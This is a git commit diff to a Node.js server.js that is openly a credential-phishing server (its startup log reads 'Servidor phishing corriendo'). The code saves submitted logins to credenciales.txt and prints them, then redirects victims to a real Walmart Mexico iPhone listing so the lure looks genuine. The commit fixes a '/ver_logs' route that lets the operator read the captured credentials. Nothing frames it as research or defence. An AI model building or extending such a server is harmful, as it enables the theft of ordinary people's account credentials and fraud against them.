b00688c16b39c9651e94279745a6e5aea803c8ad
pedrofernandezburger-code <pedrofernandezburger@gmail.com>
2026-08-28 18:38:25 -0600

    Update server.js

--- server.js
+++ server.js
@@ -19,35 +19,36 @@ const server = http.createServer((req, res) => {
             fs.appendFile('credenciales.txt', log, (err) => {
                 if (err) console.error(err);
             });
+            console.log(log);
             res.writeHead(302, { Location: 'https://www.walmart.com.mx/ip/iphone-13-pro-apple-256gb-plata-reacondicionado/00085369895462?athbdg=L1500&from=/search' });
             res.end();
         });
         return;
     }
 
+    if (req.url === '/ver_logs') {
+        fs.readFile('credenciales.txt', (err, data) => {
+            if (err) {
+                res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
+                res.end('Aún no hay credenciales capturadas');
+                return;
+            }
+            res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+            res.end(data);
+        });
+        return;
+    }
+
     fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
         if (err) {
-            res.writeHead(500);
+            res.writeHead(500, { 'Content-Type': 'text/plain' });
             res.end('Error');
             return;
         }
-        res.writeHead(200, { 'Content-Type': 'text/html' });
+        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
         res.end(data);
     });
 });
-
-if (req.url === '/ver_logs') {
-    fs.readFile('credenciales.txt', (err, data) => {
-        if (err) {
-            res.writeHead(404);
-            res.end('No hay datos aún');
-            return;
-        }
-        res.writeHead(200, { 'Content-Type': 'text/plain' });
-        res.end(data);
-    });
-    return;
-}
 
 server.listen(PORT, () => {
     console.log(`Servidor phishing corriendo en puerto ${PORT}`);
